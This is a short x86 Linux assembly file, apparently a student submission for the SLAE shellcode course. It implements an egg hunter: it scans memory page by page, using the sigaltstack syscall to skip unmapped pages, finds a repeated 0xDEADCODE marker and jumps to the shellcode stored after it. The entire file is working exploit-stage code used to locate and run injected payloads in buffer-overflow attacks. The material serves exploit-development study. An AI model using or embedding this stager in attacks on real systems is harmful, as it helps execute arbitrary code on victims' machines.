; Filename: egghunter.asm
; Author:   Reuben Sammut
; SLAE ID:  510

global _start

section .text

_start:
	xor ebx, ebx		; set ebx to 0

nextpage:			; use pages of 4096 bytes (0x1000)
	or   bx, 0xfff		; go to next page
nextbyte:
	inc  ebx		; go to next byte
	xor  eax, eax		; clear eax
	mov  al, 0xBA		; syscall number for sys_sigaltstack
	int  0x80		; syscall
	cmp  al, 0xf2		; check whether syscall return EFAULT
	jz   nextpage		; if EFAULT, go to next page
	mov  eax, 0xDEC0ADDE	; copy 0xDEADCODE to eax
	mov  edi, ebx		; copy current location to edi
	scasd			; compare edi to eax
	jnz  nextbyte		; if not equal jump to next byte
	scasd			; compare next 4 bytes to eax
	jnz  nextbyte		; if not equal jump to next byte
	jmp  edi		; else go to current shellcode

